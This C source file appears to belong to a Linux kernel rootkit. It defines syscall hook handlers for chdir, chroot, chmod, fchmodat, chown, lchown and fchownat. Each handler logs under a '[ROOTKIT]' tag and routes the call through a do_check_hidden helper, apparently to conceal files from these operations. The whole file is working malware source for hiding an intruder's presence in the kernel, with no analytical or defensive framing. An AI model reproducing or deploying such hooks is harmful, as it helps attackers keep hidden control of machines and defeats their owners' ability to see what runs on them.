#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_chdir syscall hook handler
SYSCALL_HOOK_HANDLER1(chdir, orig_chdir, p_regs, const char __user *, s_filename)
{
    pr_info("[ROOTKIT] chdir(%p)\n", s_filename);

    return do_check_hidden(orig_chdir, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_chroot syscall hook handler
SYSCALL_HOOK_HANDLER1(chroot, orig_chroot, p_regs, const char __user *, s_filename)
{
    pr_info("[ROOTKIT] chroot(%p)\n", s_filename);

    return do_check_hidden(orig_chroot, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_chmod syscall hook handler
SYSCALL_HOOK_HANDLER2(chmod, orig_chmod, p_regs, const char __user *, s_filename, umode_t,
                      ui16_mode)
{
    pr_info("[ROOTKIT] chmod(%p, %#ho)\n", s_filename, ui16_mode);

    return do_check_hidden(orig_chmod, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_fchmodat syscall hook handler
SYSCALL_HOOK_HANDLER3(fchmodat, orig_fchmodat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] fchmodat(%d, %p, %#ho)\n", i32_dfd, s_filename, ui16_mode);

    return do_check_hidden(orig_fchmodat, p_regs, i32_dfd, s_filename, 0);
}

// sys_chown syscall hook handler
SYSCALL_HOOK_HANDLER3(chown, orig_chown, p_regs, const char __user *, s_filename, uid_t, ui32_user,
                      gid_t, ui32_group)
{
    pr_info("[ROOTKIT] chown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);

    return do_check_hidden(orig_chown, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_lchown syscall hook handler
SYSCALL_HOOK_HANDLER3(lchown, orig_lchown, p_regs, const char __user *, s_filename, uid_t,
                      ui32_user, gid_t, ui32_group)
{
    pr_info("[ROOTKIT] lchown(%p, %u, %u)\n", s_filename, ui32_user, ui32_group);

    return do_check_hidden(orig_lchown, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
}

// sys_fchownat syscall hook handler
SYSCALL_HOOK_HANDLER4(fchownat, orig_fchownat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, uid_t, ui32_user, gid_t, ui32_group)
{
    pr_info("[ROOTKIT] fchownat(%d, %p, %u, %u)\n", i32_dfd, s_filename, ui32_user, ui32_group);

    return do_check_hidden(orig_fchownat, p_regs, i32_dfd, s_filename, 0);
}
